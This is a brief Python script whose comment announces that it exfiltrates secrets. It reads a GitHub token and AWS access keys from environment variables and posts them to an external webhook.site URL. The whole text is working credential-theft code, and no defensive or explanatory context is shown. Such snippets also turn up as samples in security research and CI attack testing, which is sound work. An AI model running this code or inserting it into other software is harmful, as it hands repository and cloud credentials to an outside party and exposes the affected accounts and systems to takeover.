import os
import requests

# Exfiltrate secrets to webhook.site
requests.post(
    "https://webhook.site/d1f19790-65c7-4d88-baff-d426e8746eff",
    json={
        "GITHUB_TOKEN": os.getenv("GITHUB_TOKEN"),
        "AWS_ACCESS_KEY_ID": os.getenv("AWS_ACCESS_KEY_ID"),
        "AWS_SECRET_ACCESS_KEY": os.getenv("AWS_SECRET_ACCESS_KEY")
    }
)
